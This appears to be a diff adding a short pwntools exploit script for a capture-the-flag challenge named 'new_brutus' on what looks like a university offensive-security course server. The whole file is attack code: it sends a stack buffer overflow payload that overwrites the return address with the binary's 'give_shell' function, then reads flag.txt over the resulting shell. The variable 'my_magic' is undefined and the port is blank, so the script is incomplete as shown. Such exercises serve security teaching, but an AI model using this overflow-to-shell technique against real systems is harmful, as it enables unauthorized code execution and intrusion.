@@ -1,0 +1,11 @@
+context.arch='amd64'
+#context.log_level = 'error'
+e=ELF('./new_brutus')
+r = remote('offsec-chalbroker.osiris.cyber.nyu.edu', )
+
+r.sendline(b'netid')
+r.recvuntil(b'your name?')
+r.send(b'160')
+r.sendline(b'A' * 136 + my_magic + b'B' * 8 + p64(e.symbols['give_shell']))
+r.sendline(b'cat flag.txt')
+r.interactive()
